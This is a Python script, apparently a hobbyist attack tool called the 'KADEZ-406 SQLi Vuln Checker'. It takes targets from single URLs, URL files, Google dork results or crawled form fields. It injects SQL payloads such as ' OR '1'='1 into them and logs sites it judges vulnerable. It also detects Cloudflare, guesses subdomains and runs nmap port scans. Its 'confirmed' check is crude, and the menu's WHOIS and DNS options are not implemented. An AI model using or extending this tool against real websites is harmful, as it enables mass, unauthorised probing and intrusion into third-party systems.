import requests
import sys
import time
import re
from pyfiglet import figlet_format
from googlesearch import search
from bs4 import BeautifulSoup
import socket
import whois
import nmap
import dns.resolver


def banner():
    print(figlet_format("KADEZ-406"))
    print("SQLi Vuln Checker by KADEZ-406")


def check_sqli(url):
    payloads = ["'", "'--+-", "--+-", "%27", "' OR '1'='1"]
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            original_response = requests.get(url, timeout=5)
            if response.status_code == 200:
                if payload == "'" and ("error" in response.text.lower() or response.text != original_response.text):
                    print(f"[!] Possible SQLi on {url} (Error detected with '")
                elif payload in ["'--+-", "--+-", "%27", "' OR '1'='1"] and response.text == original_response.text:
                    print(f"[+] SQLi Confirmed: {url} (Payload: {payload})")
                    with open("vuln.txt", "a") as f:
                        f.write(url + "\n")
                    return
        except requests.exceptions.Timeout:
            print("KEBANYAKAN REQUEST LU NYA SABAR DULU NAPA SIH")
            time.sleep(2)
            continue
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to connect: {url} ({e})")
    print(f"[-] No SQLi found: {url}")
    with open("trash.txt", "a") as f:
        f.write(url + "\n")


def google_dork(query, num=10, output_file="dork_results.txt"):
    print("[+] Searching Google Dork...")
    urls = []
    try:
        for result in search(query, num=num):
            print(f"[Found] {result}")
            urls.append(result)
            time.sleep(3)
        with open(output_file, "w") as f:
            for url in urls:
                f.write(url + "\n")
        print(f"[+] Results saved to {output_file}")
    except Exception:
        print("KEBANYAKAN REQUEST LU NYA SABAR DULU NAPA SIH")
    return urls


def find_parameters(url):
    print(f"[+] Crawling for parameters in {url}")
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        params = set()
        for form in forms:
            inputs = form.find_all('input')
            for inp in inputs:
                if inp.get('name'):
                    params.add(inp.get('name'))
        found_urls = [f"{url}?{param}=1" for param in params]
        print(f"[+] Found {len(found_urls)} possible parameters.")
        return found_urls
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect: {url} ({e})")
        return []


def waf_detection(url):
    print(f"[+] Checking WAF protection on {url}")
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if 'server' in response.headers and 'cloudflare' in response.headers['server'].lower():
            print("[!] WAF Detected: Cloudflare")
        else:
            print("[+] No WAF detected")
    except requests.exceptions.RequestException as e:
        print(f"[-] WAF check failed: {e}")


def subdomain_enum(domain):
    print(f"[+] Enumerating subdomains for {domain}")
    subdomains = ['www', 'mail', 'ftp', 'dev', 'test', 'api']
    for sub in subdomains:
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            print(f"[+] Found: {subdomain} ({ip})")
        except socket.gaierror:
            pass


def port_scan(target):
    print(f"[+] Scanning ports on {target}")
    nm = nmap.PortScanner()
    nm.scan(target, '20-100')
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"[+] Port {port} is {nm[host][proto][port]['state']}")


def http_headers(url):
    print(f"[+] Retrieving HTTP headers for {url}")
    try:
        response = requests.get(url, timeout=5)
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to retrieve headers: {e}")


def main():
    banner()
    mode = input(
        """[1] Single URL\n[2] Mass Scan (File)\n[3] Google Dork\n[4] Crawl Parameters\n[5] WAF Detection\n[6] Subdomain Enumeration\n[7] Port Scan\n[8] HTTP Headers\n[9] WHOIS Lookup\n[10] DNS Lookup\nChoose option: """)

    if mode == "1":
        url = input("Enter target URL (with parameter): ")
        check_sqli(url)
    elif mode == "2":
        file_path = input("Enter file path: ")
        try:
            with open(file_path, "r") as file:
                urls = file.readlines()
            for url in urls:
                url = url.strip()
                if url:
                    check_sqli(url)
                    time.sleep(1)
        except FileNotFoundError:
            print("File not found!")
    elif mode == "3":
        dork_query = input("Enter Google Dork query: ")
        num_urls = int(input("Number of URLs to retrieve: "))
        output_file = input("Enter output file name: ")
        google_dork(dork_query, num=num_urls, output_file=output_file)
    elif mode == "4":
        domain = input("Enter domain to crawl parameters: ")
        param_urls = find_parameters(domain)
        for param_url in param_urls:
            check_sqli(param_url)
    elif mode == "5":
        url = input("Enter URL for WAF detection: ")
        waf_detection(url)
    elif mode == "6":
        domain = input("Enter domain for subdomain enumeration: ")
        subdomain_enum(domain)
    elif mode == "7":
        target = input("Enter target for port scan: ")
        port_scan(target)
    elif mode == "8":
        url = input("Enter URL for HTTP headers: ")
        http_headers(url)
    else:
        print("Invalid option!")


if __name__ == "__main__":
    main()